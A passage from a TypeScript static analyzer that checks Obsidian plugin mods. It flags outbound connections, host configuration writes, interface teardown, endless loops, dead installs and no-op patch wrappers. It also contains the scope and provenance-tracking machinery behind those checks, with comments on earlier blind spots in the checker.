      // path is the only thing that distinguishes `target.onload()` from the mod's own.
      if (lifecycle !== undefined && path !== null && /(^|\.)plugins\.plugins(\.|$)/.test(path)) {
        declare('target-plugin-lifecycle', `${path}.${name}(...)`, path, lifecycle, node);
        return;
      }

      // ── other plugins, on and off ──
      const toggle = PLUGIN_ENABLEMENT_METHODS.get(name);
      if (toggle !== undefined && (model.internalRooted.has(recv as acorn.MemberExpression) || recv.type === 'MemberExpression')) {
        if (model.internalRooted.has(recv as acorn.MemberExpression)) {
          const which = literalArg(node);
          declare('plugin-enablement', `${path ?? '<app.plugins>'}.${name}(...)`, which ?? path, withTarget(toggle, which), node);
          return;
        }
      }

      // ── Obsidian's own configuration, rewritten for the whole vault ──
      const cfg = HOST_CONFIG_METHODS.get(name);
      if (cfg !== undefined && isHostish(prov)) {
        declare('host-config-write', `${path ?? '<app>'}.${name}(...)`, path, cfg, node);
        return;
      }

      // ── Obsidian's own interface, taken apart ──
      //
      // `host` and not `isHostish`: every one of these method names is also an ordinary teardown on
      // something the mod built, and a declaration the reader learns to skip is worse than none.
      const destroy = DOM_DESTRUCTION_METHODS.get(name);
      if (destroy !== undefined && prov === 'host') {
        declare('host-dom-destruction', `${path ?? '<element>'}.${name}()`, path, destroy, node);
      }
    },

    NewExpression(node, _state, ancestors) {
      const scope = model.scopeFor(ancestors);
      const ctor = model.reclaimableCtorOf(node.callee, scope) ?? calleeName(node.callee, consts);
      if (ctor === null) return;
      if (ctor !== 'WebSocket' && ctor !== 'EventSource' && ctor !== 'XMLHttpRequest') return;
      const arg = node.arguments[0];
      const url = arg === undefined || arg.type === 'SpreadElement' ? null : staticStringValue(arg, consts);
      declare(
        'network-egress',
        `new ${ctor}(...)`,
        url,
        url === null
          ? `opens a live ${ctor} connection out of the vault`
          : `opens a live ${ctor} connection to ${url}`,
        node,
      );
    },
  });
}

/* ────────────────────────────────────────────────────────────────────────────
 * Liveness — the mod that never stops, and the mod that never starts
 * ──────────────────────────────────────────────────────────────────────────── */

/**
 * Two failure modes that are neither a leak nor an effect: the mod that hangs Obsidian, and the mod
 * that provably does nothing.
 *
 * The first is the more urgent, and it is the one most likely to happen **by accident**:
 * `async onload() { while (true) { await Promise.resolve(); if (ready) break; } }` never yields to
 * the event loop, so there is no handle to unload, `unload()` never gets a turn, and — because the
 * mod stays *enabled* — relaunching Obsidian hangs it again. Recovery means editing
 * `community-plugins.json` from outside the app.
 *
 * The second is what the no-effect probe was supposed to answer and cannot: a wrapper that only
 * calls through, or an install behind a condition that is statically false. Only a run can prove a
 * mod had no effect; what a parser can prove is that this one *cannot* have had one, and that much
 * is worth saying before the run.
 */
function checkLiveness(program: acorn.Program, model: Analysis, add: Add): void {
  const consts = model.constStrings;
  /** `const ENABLED = false` — the folding a dead-branch check needs and `constStrings` does not do. */
  const constBooleans = new Map<string, boolean>();
  walk.simple(program, {
    VariableDeclaration: (node) => {
      if (node.kind !== 'const') return;
      for (const d of node.declarations) {
        if (d.id.type !== 'Identifier' || !d.init) continue;
        const inner = unwrapChain(d.init);
        if (inner.type === 'Literal' && typeof inner.value === 'boolean') {
          constBooleans.set(d.id.name, inner.value);
        }
      }
    },
  });

  /** `true` / `false` when the test cannot be anything else, `null` when it can. */
  const truthOf = (node: acorn.AnyNode | null | undefined): boolean | null => {
    if (node === null || node === undefined) return true; // `for (;;)` has no test at all
    const inner = unwrapChain(node);
    if (inner.type === 'Literal') {
      if (typeof inner.value === 'boolean') return inner.value;
      if (typeof inner.value === 'number') return inner.value !== 0;
      if (typeof inner.value === 'string') return inner.value.length > 0;
      return null;
    }
    if (inner.type === 'Identifier') return constBooleans.get(inner.name) ?? null;
    if (inner.type === 'UnaryExpression' && inner.operator === '!') {
      const t = truthOf(inner.argument);
      return t === null ? null : !t;
    }
    return null;
  };

  const LOOP_MESSAGE =
    'a loop whose condition can never be false — there is no handle for unload() to cancel, and an ' +
    'async body never yields the turn unload() would need. Obsidian stays hung, the mod stays ' +
    'ENABLED, and relaunching hangs it again, so the only recovery is editing community-plugins.json ' +
    'from outside the app. Wait for state with this.app.workspace.onLayoutReady(fn) or a registered ' +
    'event, and repeat work with this.registerInterval(window.setInterval(fn, ms))';

  walk.ancestor(program, {
    WhileStatement(node) {
      if (truthOf(node.test) === true) add('no-unstoppable-loop', LOOP_MESSAGE, node);
    },
    DoWhileStatement(node) {
      if (truthOf(node.test) === true) add('no-unstoppable-loop', LOOP_MESSAGE, node);
    },
    ForStatement(node) {
      if (truthOf(node.test ?? null) === true) add('no-unstoppable-loop', LOOP_MESSAGE, node);
    },

    /**
     * A callback that re-arms itself through a promise, or an async function that calls itself.
     *
     * The timer spellings of the same loop are already `no-raw-timer` — including
     * `queueMicrotask`, which joined {@link RAW_TIMER_CALLS} in this pass — so this covers only the
     * two that had no rule at all: `Promise.resolve().then(loop)` and `async spin() { await …;
     * return this.spin(); }`.
     */
    FunctionDeclaration(node, _state, ancestors) {
      checkSelfSchedule(node, node.id?.name ?? null, ancestors);
    },
    FunctionExpression(node, _state, ancestors) {
      checkSelfSchedule(node, selfName(node, ancestors), ancestors);
    },
    ArrowFunctionExpression(node, _state, ancestors) {
      checkSelfSchedule(node, selfName(node, ancestors), ancestors);
    },
  });

  /** The name a function can call itself by: its own id, its `const`, or its method name. */
  function selfName(node: acorn.Function, ancestors: readonly acorn.AnyNode[]): string | null {
    if (node.type === 'FunctionExpression' && node.id) return node.id.name;
    const parent = ancestors[ancestors.length - 2];
    if (parent?.type === 'VariableDeclarator' && parent.id.type === 'Identifier') return parent.id.name;
    if (parent?.type === 'MethodDefinition' && !parent.computed && parent.key.type === 'Identifier') {
      return parent.key.name;
    }
    return null;
  }

  function checkSelfSchedule(fn: acorn.Function, name: string | null, ancestors: readonly acorn.AnyNode[]): void {
    if (name === null) return;
    const isMethod = ancestors[ancestors.length - 2]?.type === 'MethodDefinition';
    let hasAwait = false;
    let offender: acorn.AnyNode | null = null;
    walk.full(fn.body, (child) => {
      if (child.type === 'AwaitExpression') hasAwait = true;
      if (offender !== null) return;
      if (child.type !== 'CallExpression') return;
      const callee = unwrapChain(child.callee);
      // `Promise.resolve().then(loop)` / `p.finally(loop)` — a microtask re-arm.
      const method = callee.type === 'MemberExpression' ? propertyName(callee, consts) : null;
      if (method === 'then' || method === 'finally' || method === 'catch') {
        for (const a of child.arguments) {
          if (unwrapChain(a).type === 'Identifier' && (unwrapChain(a) as acorn.Identifier).name === name) {
            offender = child;
          }
        }
        return;
      }
      // A direct self-call. Only an *async* one is a pump — a bounded recursive helper is ordinary
      // code, and it is the `await` that turns recursion into an unstoppable scheduler.
      if (callee.type === 'Identifier' && callee.name === name && !isMethod) offender = child;
      if (
        isMethod &&
        callee.type === 'MemberExpression' &&
        unwrapChain(callee.object).type === 'ThisExpression' &&
        propertyName(callee, consts) === name
      ) {
        offender = child;
      }
    });
    if (offender === null) return;
    const promiseArm =
      (offender as acorn.CallExpression).callee.type === 'MemberExpression' &&
      unwrapChain((offender as acorn.CallExpression).callee).type === 'MemberExpression' &&
      propertyName(unwrapChain((offender as acorn.CallExpression).callee) as acorn.MemberExpression, consts) !== name;
    if (!promiseArm && !hasAwait) return;
    add(
      'no-unstoppable-loop',
      `\`${name}\` re-arms itself on the microtask queue — nothing holds a handle to it, so unload() ` +
        'has nothing to cancel and the callback outlives the mod, rescheduling forever. Wait for ' +
        'state with this.app.workspace.onLayoutReady(fn) or a registered event, and repeat work with ' +
        'this.registerInterval(window.setInterval(fn, ms)), which Obsidian cancels for you',
      offender,
    );
  }

  // ── the install that can never run ──
  walk.simple(program, {
    IfStatement: (node) => {
      const t = truthOf(node.test);
      if (t === null) return;
      const dead = t ? node.alternate : node.consequent;
      if (!dead) return;
      let install: acorn.AnyNode | null = null;
      walk.full(dead, (child) => {
        if (install !== null) return;
        if (child.type === 'CallExpression' && (model.installNodes.has(child) || isRegisterCall(child))) {
          install = child;
        }
      });
      if (install === null) return;
      add(
        'unreachable-install',
        'the patch is installed inside a branch whose condition is a constant — this mod provably ' +
          'does nothing at all. The no-effect probe cannot catch this, because the code never runs ' +
          'to be probed. Remove the flag, or make the condition something the mod actually reads',
        install,
      );
    },
  });

  // ── the wrapper that only calls through ──
  for (const { node, member } of model.wrapperBodies) {
    if (!isPassThroughWrapper(node)) continue;
    add(
      'no-op-patch',
      `the wrapper installed on \`${member}\` only calls the original and returns its result — ` +
        'this patch changes nothing observable, so the mod ships, installs, reports `applied` and ' +
        'does exactly what the unmodded plugin did. Whether a mod had an effect can only be settled ' +
        'by running it (that is what modkitProbe() is for); what is decidable here is that this one ' +
        'cannot have had one',
      node,
    );
  }
}

/**
 * Is this wrapper body exactly `return next.apply(this, args)` — the shape that satisfies every rule
 * in this file and changes nothing?
 *
 * Deliberately narrow. A wrapper that rewrites an argument, rewrites the return value, or counts a
 * call on the plugin is a real behaviour change and MUST NOT be flagged: those are the mods the
 * product exists to make, and a warning on them steers the correction turn away from useful work.
 */
function isPassThroughWrapper(fn: acorn.Function): boolean {
  const body = fn.body;
  if (body.type !== 'BlockStatement') return false;
  const stmts = body.body;
  if (stmts.length !== 1) return false;
  const only = stmts[0];
  if (!only || only.type !== 'ReturnStatement' || !only.argument) return false;
  const call = unwrapChain(only.argument);
  if (call.type !== 'CallExpression') return false;
  const callee = unwrapChain(call.callee);
  if (callee.type !== 'MemberExpression') return false;
  const verb = propertyName(callee);
  if (verb !== 'apply' && verb !== 'call') return false;
  if (unwrapChain(callee.object).type !== 'Identifier') return false;
  const first = call.arguments[0];
  if (first === undefined || unwrapChain(first).type !== 'ThisExpression') return false;
  // The remaining arguments have to be the wrapper's own parameters, unchanged and in order.
  const params = fn.params;
  const rest = params.length === 1 && params[0]?.type === 'RestElement' ? params[0] : null;
  const restName =
    rest !== null && rest.argument.type === 'Identifier' ? rest.argument.name : null;
  if (verb === 'apply') {
    if (call.arguments.length !== 2) return false;
    const second = call.arguments[1];
    if (second === undefined) return false;
    const inner = unwrapChain(second);
    return inner.type === 'Identifier' && inner.name === restName;
  }
  // `.call(this, ...args)`
  if (call.arguments.length !== 2) return false;
  const second = call.arguments[1];
  if (second === undefined || second.type !== 'SpreadElement') return false;
  const inner = unwrapChain(second.argument);
  return inner.type === 'Identifier' && inner.name === restName;
}

/* ────────────────────────────────────────────────────────────────────────────
 * Pass 1 — the abstract interpretation
 * ──────────────────────────────────────────────────────────────────────────── */

/** One lexical scope. The chain, not a flat map — see the file header. */
interface Scope {
  node: acorn.AnyNode;
  parent: Scope | null;
  vars: Map<string, Binding>;
  /** The class whose `this` is in effect here, when there is one. */
  cls: acorn.Class | null;
  /** Whether `this` here is the mod's own object (a class method) rather than a dynamic receiver. */
  thisIsOwned: boolean;
  /** Whether this scope is a function body, for `var` hoisting. */
  isFunctionScope: boolean;
}

interface Binding {
  uid: number;
  name: string;
  prov: Prov;
  /** The class this binding aliases the `this` of — `const me = this`. */
  thisOf: acorn.Class | null;
  /**
   * Bound from `<receiver>.<property>`. This is what catches a **detached method**:
   * `const s = activeWindow.setInterval; s(fn, 100)` carries the method's name here and nowhere
   * else, so `calleeNameAt` consults it.
   */
  member: { receiver: acorn.AnyNode; property: string | null; scope: Scope } | null;
  /**
   * Arguments baked in by `.bind(thisArg, …rest)`, with the scope they were written in.
   *
   * `const put = Reflect.set.bind(null, hostProto); put("getTasks", fn)` is a host write whose
   * target never appears at the call site at all — it was reproduced at zero findings, because the
   * mutator rule read `node.arguments[0]` and found the string `"getTasks"`.
   */
  boundArgs: { nodes: acorn.AnyNode[]; scope: Scope } | null;
  /** The initialiser expression, for `const off = around(...); this.register(off)`. */
  init: acorn.AnyNode | null;
  /** The function this name refers to, for call-site parameter binding. */
  fnNode: acorn.Function | null;
  isPrototype: boolean;
  isAround: boolean;
  isAroundNamespace: boolean;
  isCodeLoader: boolean;
  isWindow: boolean;
  /** `Object` / `Reflect`, so `const O = Object; O.assign(host, …)` still counts. */
  mutatorName: string | null;
  /** The {@link RECLAIMABLE_CONSTRUCTORS} name it ultimately refers to. */
  ctorName: string | null;
  /** The canonical dotted path its initialiser named, for the pre-flight identity checks. */
  path: string | null;
}

/** Per-class `this.<field>` provenance, joined across every write anywhere in the class. */
interface FieldInfo {
  prov: Prov;
  isWindow: boolean;
}

interface DescriptorCall {
  start: number;
  holder: string | null;
  member: string | null;
  inFn: string | null;
}

/**
 * One scope, with the `this` rules that make `const me = this` and the `around()` spec's inner
 * `function` behave differently — which is exactly the difference the S3 bypass turned on.
 */
function makeScope(
  node: acorn.AnyNode,
  parentNode: acorn.AnyNode | null,
  parent: Scope | null,
  nearestClass: acorn.Class | null,
): Scope {
  const isFn = isFunctionNode(node);
  let thisIsOwned: boolean;
  let cls: acorn.Class | null = nearestClass;
  if (node.type === 'ArrowFunctionExpression' || !isFn) {
    // An arrow inherits `this`; so does a block, a loop, a catch. A `static {}` block's `this` is
    // the class itself.
    thisIsOwned = node.type === 'StaticBlock' ? true : (parent === null ? false : parent.thisIsOwned);
    if (node.type !== 'StaticBlock' && parent !== null) cls = parent.cls;
  } else {
    // A plain `function`'s `this` is its *dynamic receiver*. Inside the `around()` spec's
    // `getTasks(next) { return function () { … } }` that receiver is the target's instance, not the
    // mod — so `this` there is not owned, and a write through it fails closed.
    thisIsOwned = parentNode?.type === 'MethodDefinition' || parentNode?.type === 'PropertyDefinition';
    if (!thisIsOwned) cls = null;
  }
  return {
    node,
    parent,
    vars: new Map(),
    cls,
    thisIsOwned,
    isFunctionScope: isFn || node.type === 'Program' || node.type === 'StaticBlock',
  };
}

function makeBinding(uid: number, name: string): Binding {
  return {
    uid,
    name,
    prov: 'static',
    thisOf: null,
    member: null,
    boundArgs: null,
    init: null,
    fnNode: null,
    isPrototype: false,
    isAround: false,
    isAroundNamespace: false,
    isCodeLoader: false,
    isWindow: false,
    mutatorName: null,
    ctorName: null,
    path: null,
  };
}

/**
 * The whole model of one file: scopes, bindings, the lattice evaluator, and the facts the rules ask
 * for. Built once per `validate()` call.
 */
class Analysis {
  readonly program: acorn.Program;

  /* ── scopes and bindings ── */
  private readonly scopes = new Map<acorn.AnyNode, Scope>();
  private uid = 0;

  /* ── facts the rules read ── */
  readonly sanctionedGlobals = new Set<acorn.AnyNode>();
  readonly sanctionedTimers = new Set<acorn.AnyNode>();
  readonly sanctionedAround = new Set<acorn.AnyNode>();
  readonly sanctionedEvents = new Set<acorn.AnyNode>();
  readonly internalRooted = new Set<acorn.MemberExpression>();
  readonly constStrings = new Map<string, string>();
  readonly obsidianImports = new Map<string, string>();
  readonly topLevelClasses = new Map<string, acorn.Class>();
  /**
   * The reclaim ledger, keyed on {@link Analysis.reclaimKey} — a **binding uid** or a
   * `this.<field>` path, never a bare name.
   *
   * ⚠️ It used to be a global, unscoped `Set<string>` of names, head-matched against a dotted path,
   * and that one defect was loose and tight at once. Loose: one correct teardown disarmed
   * `must-be-reclaimed` for the *whole file*, and because the template's own register block mentions
   * `self`, `holder`, `next`, `args` and `err`, those names were pre-poisoned for every generated
   * mod. Tight: a `root` reclaimed in `onload()` also "reclaimed" an unrelated `root` in another
   * method. A uid answers both, because it is the binding and not its spelling.
   */
  readonly reclaimedKeys = new Set<string>();
  readonly reclaimedTeardowns = new Map<string, Set<string>>();
  /** Keys that name the same object — see {@link keyReclaimed}. */
  private readonly reclaimAliases = new Map<string, Set<string>>();
  firstAround: acorn.CallExpression | null = null;
  /**
   * Where the mod installs its patch, whether or not it used `around()`.
   *
   * ⚠️ The whole template contract used to hang off `firstAround`, so a mod that installed by
   * assignment skipped the version gate, the accessor pre-flight and the bound-method check in
   * silence — proved by a matched pair of complete mods where only the install spelling differed.
   */
  firstInstall: PositionedNode | null = null;
  /** The holder the patch installs on, for the identity half of the pre-flight rules. */
  installHolder: { node: acorn.AnyNode; scope: Scope } | null = null;
  /** The members the patch touches, for the same reason. */
  installMembers = new Set<string>();
  /** Every install site, by node identity — so a dead-branch check can ask "is an install in here?". */
  readonly installNodes = new Set<acorn.AnyNode>();
  /**
   * The inner function an `around()` spec hands back for each member it wraps — the thing that
   * actually runs in place of the original, and so the only place a mod's *effect* can live.
   */
  readonly wrapperBodies: { node: acorn.Function; member: string }[] = [];
  /** The function the install sits in, so a gate written beside it counts as before it. */
  firstAroundFn: acorn.Function | null = null;
  /**
   * Whether the holder is a prototype dug out of a **live object obtained at runtime** rather than
   * off an `obsidian` export. `requireApiVersion()` is a complete gate for Obsidian's own API; it
   * says nothing about a third-party class reached through `leaf.view.constructor.prototype`.
   */
  patchesDerivedPrototype = false;
  firstGateEnd: number | null = null;
  hasAccessorPreflight = false;
  hasBoundShadowCheck = false;
  hasProbe = false;
  patchesPrototype = false;

  /* ── internals ── */
  private readonly classFields = new Map<acorn.Class, Map<string, FieldInfo>>();
  /** `this.socket = new WebSocket(…)` — which constructor a field holds, for the effects pass. */
  private readonly classFieldCtors = new Map<acorn.Class, Map<string, string>>();
  private readonly classMethods = new Map<acorn.Class, Map<string, acorn.Function>>();
  private readonly hostManagedClasses = new Set<acorn.Class>();
  /** Classes that extend an Obsidian class other than `Plugin`, transitively. See {@link fieldProv}. */
  private readonly hostSubclasses = new Set<acorn.Class>();
  private readonly classIds = new Map<acorn.Class, number>();
  /** Subtrees whose calls are teardowns, with the caller→callee key substitution reaching them. */
  private readonly teardownRegions: { start: number; end: number; subst: Map<string, string> }[] = [];
  private readonly obsidianLocalNames = new Set<string>();
  private readonly aroundLocals = new Set<string>();
  private readonly aroundNamespaceLocals = new Set<string>();
  private readonly returnProv = new Map<acorn.Function, Prov>();
  private readonly returnExprs = new Map<acorn.Function, { node: acorn.AnyNode; scope: Scope }[]>();
  private readonly paramSources = new Map<acorn.Function, { index: number; node: acorn.AnyNode; scope: Scope }[]>();
  private readonly paramBindings = new Map<acorn.Function, (Binding | null)[]>();
  /**
   * A parameter's `= default`, index-aligned with {@link paramBindings}.
   *
   * ⚠️ Never joined in until 2026-08-31, so a call with fewer arguments than parameters left the
   * binding at whatever the *other* call sites gave it: `function install(h = holder) { h.getTasks =
   * fn } install()` returned ZERO findings on four spellings. A default is a call site the analysis
   * can see perfectly; it was simply not being read.
   */
  private readonly paramDefaults = new Map<acorn.Function, ({ node: acorn.AnyNode; scope: Scope } | null)[]>();
  /** A class binding takes what its own members can hand back — `class B { static get h() { … } }`. */
  private readonly classMemberEdges: { binding: Binding; fn: acorn.Function | null; node: acorn.AnyNode | null; scope: Scope }[] = [];
  private readonly calledFunctions = new Set<acorn.Function>();
  private readonly escapedFunctions = new Set<acorn.Function>();
  /** Re-evaluated to a fixed point: pattern declarations, identifier writes, collection writes. */
  private readonly patternEdges: { pattern: acorn.AnyNode; init: acorn.AnyNode | null; scope: Scope }[] = [];
  private readonly identEdges: { binding: Binding; node: acorn.AnyNode; scope: Scope }[] = [];
  private readonly fieldEdges: { cls: acorn.Class; name: string; node: acorn.AnyNode; scope: Scope }[] = [];
  private readonly collectionEdges: { binding: Binding; node: acorn.AnyNode; scope: Scope }[] = [];
  /**
   * Where each binding's canonical dotted path comes from — a declarator's initialiser, or the
   * first call-site argument bound to a parameter.
   *
   * The pre-flight rules compare *identity*: "was the descriptor taken on the same holder the patch
   * installs on?". `descriptorFor(holder, name)` reads the descriptor off its own parameter, so
   * without the parameter edge the two paths never match and the template rejects itself.
   */
  private readonly pathEdges: { binding: Binding; node: acorn.AnyNode; scope: Scope }[] = [];
  /**
   * Which `around()` calls each binding may hold, for the reachability half of
   * `patch-must-be-registered`. Solved to a fixed point exactly like provenance is, and for the same
   * reason: the value reaches the registered callback through arrays, aliases and `for…of` bindings,
   * none of which a lexical rule can see.
   */
  private readonly aroundValues = new Map<Binding, Set<acorn.CallExpression>>();
  private readonly aroundEdges: { binding: Binding; node: acorn.AnyNode; scope: Scope }[] = [];
  /** The bodies of callbacks passed to `this.register(...)` — where an uninstaller may be reached. */
  private readonly registeredRegions: { start: number; end: number }[] = [];
  private depth = 0;

  constructor(program: acorn.Program) {
    this.program = program;
  }

  /* ────────────────────────────────────────────────────────────────────────
   * Scope construction
   * ──────────────────────────────────────────────────────────────────────── */

  /**
   * The scope in effect at a node, built top-down from the ancestor chain.
   *
   * acorn-walk visits post-order, so scopes cannot be created as they are entered; building the
   * chain on demand from `ancestors` gives the same answer in any visit order.
   */
  scopeFor(ancestors: readonly acorn.AnyNode[]): Scope {
    let cur: Scope | null = null;
    for (let i = 0; i < ancestors.length; i++) {
      const n = ancestors[i];
      if (!n || !isScopeNode(n)) continue;
      let s = this.scopes.get(n);
      if (!s) {
        s = makeScope(n, i > 0 ? (ancestors[i - 1] ?? null) : null, cur, nearestClassBefore(ancestors, i));
        this.scopes.set(n, s);
      }
      cur = s;
    }
    // `ancestors` always starts at Program, which is a scope node.
    return cur ?? this.rootScope();
  }

  private rootScope(): Scope {
    let s = this.scopes.get(this.program);
    if (!s) {
      s = {
        node: this.program,
        parent: null,
        vars: new Map(),
        cls: null,
        thisIsOwned: false,
        isFunctionScope: true,
      };
      this.scopes.set(this.program, s);
    }
    return s;
  }

  /* ────────────────────────────────────────────────────────────────────────
   * Reclaim identity
   * ──────────────────────────────────────────────────────────────────────── */

  private classId(cls: acorn.Class): number {
    let id = this.classIds.get(cls);
    if (id === undefined) {
      id = this.classIds.size;
      this.classIds.set(cls, id);
    }
    return id;
  }

  /**
   * A stable identity for "the thing a teardown gives back".
   *
   * `v:<uid>` for a binding, `c:<class>` for the object a class method's `this` names (so
   * `const self = this` and `this` are the same identity), and a dotted suffix for each member hop.
   * Two different `root` bindings in two different methods get two different keys, and one
   * `this.styleEl.remove()` does not reclaim `this.app.workspace.containerEl`.
   */
  reclaimKey(raw: acorn.AnyNode | null | undefined, scope: Scope, depth = 0): string | null {
    if (raw === null || raw === undefined || depth > 12) return null;
    const node = unwrapChain(raw);
    if (node.type === 'ThisExpression') {
      const cls = this.thisClassOf(node, scope);
      return cls === undefined || cls === null ? null : `c:${this.classId(cls)}`;
    }
    if (node.type === 'Identifier') {
      const b = this.lookup(node.name, scope);
      if (!b) return null;
      if (b.thisOf !== null) return `c:${this.classId(b.thisOf)}`;
      return `v:${b.uid}`;
    }
    if (node.type === 'MemberExpression') {
      const base = this.reclaimKey(node.object, scope, depth + 1);
      if (base === null) return null;
      const prop = propertyName(node, this.constStrings);
      if (prop === null) return null;
      return `${base}.${prop}`;
    }
    return null;
  }

  /**
   * Is this key, or a container it sits inside, given back at unload?
   *
   * Prefix matching survives from the old name-based ledger and is *correct* on a key: removing
   * `root` removes `root.firstChild` with it. What it no longer does is match two unrelated
   * bindings that happen to share a spelling.
   */
  keyReclaimed(key: string | null): boolean {
    if (key === null) return false;
    const seen = new Set<string>();
    const queue = [key];
    while (queue.length > 0) {
      const cur = queue.pop();
      if (cur === undefined || seen.has(cur)) continue;
      seen.add(cur);
      if (this.reclaimedKeys.has(cur)) return true;
      // The container a key sits inside: removing `root` removes `root.firstChild` with it.
      const idx = cur.lastIndexOf('.');
      if (idx > 0) queue.push(cur.slice(0, idx));
      // ⚠️ And the same object under its **other name**. `const style = …; this.styleEl = style;`
      // then `this.styleEl.remove()` reclaims `v:<style>` — one object, two keys, and the ledger
      // knew only one of them. Both `this.register(this.cleanup.bind(this))` and `onunload()`, the
      // two spellings the API docs use, were rejected on exactly that: a FALSE rejection, which
      // steers the one correction turn away from the correct code.
      for (const [from, tos] of this.reclaimAliases) {
        if (cur === from) for (const t of tos) queue.push(t);
        else if (cur.startsWith(`${from}.`)) for (const t of tos) queue.push(t + cur.slice(from.length));
      }
    }
    return false;
  }

  /**
   * `a` and `b` name the same object, so reclaiming either reclaims both.
   *
   * Recorded symmetrically and only for *identity* assignments — `this.f = x`, `const a = b`,
   * `const a = this.f`. Anything computed in between is a different object and gets no alias.
   */
  private collectReclaimAliases(): void {
    const self = this;
    const link = (a: string | null, b: string | null): void => {
      if (a === null || b === null || a === b) return;
      for (const [from, to] of [
        [a, b],
        [b, a],
      ] as const) {
        let set = self.reclaimAliases.get(from);
        if (!set) {
          set = new Set();
          self.reclaimAliases.set(from, set);
        }
        set.add(to);
      }
    };
    const isIdentityValue = (node: acorn.AnyNode): boolean => {
      const inner = unwrapValue(node);
      return inner.type === 'Identifier' || inner.type === 'MemberExpression' || inner.type === 'ThisExpression';
    };
    walk.ancestor(this.program, {
      VariableDeclarator(node, _state, ancestors) {
        if (node.id.type !== 'Identifier' || !node.init) return;
        if (!isIdentityValue(node.init)) return;
        const scope = self.scopeFor(ancestors);
        link(self.reclaimKey(node.id, scope), self.reclaimKey(node.init, scope));
      },
      AssignmentExpression(node, _state, ancestors) {
        if (node.operator !== '=') return;
        if (!isIdentityValue(node.right)) return;
        const scope = self.scopeFor(ancestors);
        link(self.reclaimKey(node.left, scope), self.reclaimKey(node.right, scope));
      },
    });
  }

  /** {@link keyReclaimed} on an expression. */
  isReclaimed(node: acorn.AnyNode | null | undefined, scope: Scope): boolean {
    return this.keyReclaimed(this.reclaimKey(node, scope));
  }

  /** Scope-correct resolution. A helper parameter shadowing an outer name is that parameter. */
  lookup(name: string, scope: Scope | null): Binding | null {
    for (let s: Scope | null = scope; s !== null; s = s.parent) {
      const b = s.vars.get(name);
      if (b) return b;
    }
    return null;
  }

  private declare(scope: Scope, name: string): Binding {
    const existing = scope.vars.get(name);
    if (existing) return existing;
    const b = makeBinding(this.uid++, name);
    scope.vars.set(name, b);
    return b;
  }

  private functionScope(scope: Scope): Scope {
    for (let s: Scope | null = scope; s !== null; s = s.parent) {
      if (s.isFunctionScope) return s;
    }
    return this.rootScope();
  }

  /* ────────────────────────────────────────────────────────────────────────
   * The lattice evaluator
   * ──────────────────────────────────────────────────────────────────────── */

  /** What does this expression evaluate to, on the lattice? Unmodelled ⇒ `unknown` ⇒ host. */
  provOf(node: acorn.AnyNode, scope: Scope): Prov {
    if (this.depth > 48) return 'unknown';
    this.depth++;
    try {
      return this.provOfInner(node, scope);
    } finally {
      this.depth--;
    }
  }

  private provOfInner(raw: acorn.AnyNode, scope: Scope): Prov {
    const node = unwrapChain(raw);
    switch (node.type) {
      case 'Literal':
      case 'TemplateLiteral':
      case 'BinaryExpression':
      case 'UnaryExpression':
      case 'UpdateExpression':
        return 'static';

      case 'ArrowFunctionExpression':
      case 'FunctionExpression':
      case 'ClassExpression':
        return 'owned';

      case 'NewExpression': {
        // ⚠️ This used to return `owned` unconditionally, on the comment "a freshly constructed
        // object is the mod's own". That is false for every constructor that **wraps** its argument,
        // and the cheapest one is on INERT_GLOBALS: `const p = new Proxy(holder, {}); p.getTasks =
        // fn` returned ZERO findings while every write landed on the real prototype. `new
        // WeakRef(holder).deref()`, `new Map([["h", holder]])` and a one-line user class that
        // stashes its argument are the same defect in four other spellings.
        //
        // The construction itself is still `owned` — that is what keeps `new Notice("…")` and
        // `new MutationObserver(fn)` legal — but a host value handed to a constructor can come back
        // out of it, so the arguments join in. This is the lattice's own rule (`join` is `max`)
        // applied where an exception used to sit.
        let p: Prov = 'owned';
        for (const a of node.arguments) {
          p = joinProv(p, this.provOf(a.type === 'SpreadElement' ? a.argument : a, scope));
        }
        return p;
      }

      case 'ThisExpression':
        return scope.thisIsOwned ? 'owned' : 'unknown';

      case 'Identifier': {
        const b = this.lookup(node.name, scope);
        if (b) return b.prov;
        if (HOST_GLOBAL_ROOTS.has(node.name)) return 'host';
        if (INERT_GLOBALS.has(node.name)) return 'static';
        return 'unknown';
      }

      case 'MemberExpression': {
        if (this.internalRooted.has(node)) return 'host';
        const objNode = unwrapChain(node.object);
        const key = propertyName(node, this.constStrings);
        // `this.<field>` and `me.<field>` where `const me = this` — the same question either way.
        const cls = this.thisClassOf(objNode, scope);
        if (cls !== undefined) {
          if (cls === null) return 'unknown';
          if (key === null) return 'unknown';
          return this.fieldProv(cls, key).prov;
        }
        // ⚠️ A property read INHERITS its object, which is right downward (a property of a host
        // object is the host's) and wrong upward for the handful of members that climb *out* of what
        // the mod owns: `myDiv.parentElement` is Obsidian's element the moment the div is appended.
        // Degrade rather than inherit — see the audit note on the call cell below.
        if (key !== null && ESCAPING_MEMBERS.has(key)) {
          return joinProv(this.provOf(objNode, scope), 'unknown');
        }
        return this.provOf(objNode, scope);
      }

      case 'CallExpression': {
        const callee = unwrapChain(node.callee);
        if (callee.type === 'MemberExpression') {
          const method = propertyName(callee, this.constStrings);
          if (method !== null && OWNING_FACTORIES.has(method)) return 'owned';
        }
        const fn = this.resolveCallee(node, scope);
        // ⚠️ The missing entry is the **bottom** of the lattice, not `unknown`, and the difference is
        // not academic: `join` is `max` and provenance only ever rises, so a value read before the
        // fixed point has computed it must start at bottom or it sticks forever. With `unknown` here,
        // `const b = this.box(); b.addClass("mine")` was rejected on a helper that returns
        // `activeDocument.createElement("div")` — round 0 read `unknown`, and no later round could
        // lower it. A resolved function with no return expressions genuinely does hand back
        // `undefined`, so `static` is also the honest answer once the solve has settled.
        if (fn) return this.returnProv.get(fn) ?? 'static';
        if (callee.type === 'Identifier') {
          if (PRIMITIVE_COERCERS.has(callee.name) && this.lookup(callee.name, scope) === null) {
            return 'static';
          }
          // A call through a name we cannot follow tells us nothing about what came back.
          return 'unknown';
        }
        if (callee.type === 'MemberExpression') {
          let p = this.provOf(callee.object, scope);
          for (const a of node.arguments) p = joinProv(p, this.provOf(a, scope));
          // ⚠️ **A CALL IS NOT ITS RECEIVER.** This branch used to return the receiver's provenance
          // outright, which is the one cell in the whole lattice where an unresolvable step
          // *inherits* instead of *degrading* — and inheriting is only sound downward. `owned.foo()`
          // hands back whatever `foo` chose to return, and the analysis has established nothing
          // about it: `this.notAMethod()` and (before {@link propertyName} learned `#private`)
          // `this.#holder()` both came back `owned`. A `static` receiver is exempt because
          // {@link INERT_GLOBALS} is *defined* as "calling through this cannot hand back a host
